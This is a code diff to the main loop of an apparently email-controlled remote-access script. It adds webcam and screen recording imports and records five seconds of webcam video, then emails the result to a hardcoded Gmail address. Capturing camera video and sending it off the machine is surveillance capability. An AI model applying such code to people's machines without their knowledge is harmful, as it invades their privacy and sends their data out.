@@ -1,9 +1,11 @@
+from urllib import response
 from mail_service import MailService
 
 import threading
 import time
 import datetime
-from services.screen import screen_shot
+from services.screen import screen_record, screen_shot
+from services.webcam import webcam_record, webcam_shot
 
 from utils import *
 from constants import *
@@ -103,16 +105,19 @@ def main():
         # data, msg = screen_shot()
         # request = 'SCREEN get image'
 
-        # content, data = html_mail(request, html)
-        # print(data)
-        # print(imghdr.what(None, data[1]))
+        # result = webcam_shot()
+        # request = 'WEBCAM get image'
+
+        result = webcam_record(5)
+        request = 'WEBCAM get video 5'
 
         content = {
             'html': html_mail(request, result['html']),
             'data': result['data']
         }
-
+        
         mail = build_email_content(REMOTE_MAIL, ['hoangnhuquynh2015@gmail.com'], 'Demo send mail', content)
+        # mail = build_email_content(REMOTE_MAIL, ['bot.remote.2@gmail.com'], 'Demo WEBCAM video attachment', content)
         host_mail.send_mail(mail)
 
         # mail = build_email_content(REMOTE_MAIL, ['bot.remote.2@gmail.com'], 'Demo PNG attachment', content, data = data)
@@ -146,3 +151,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
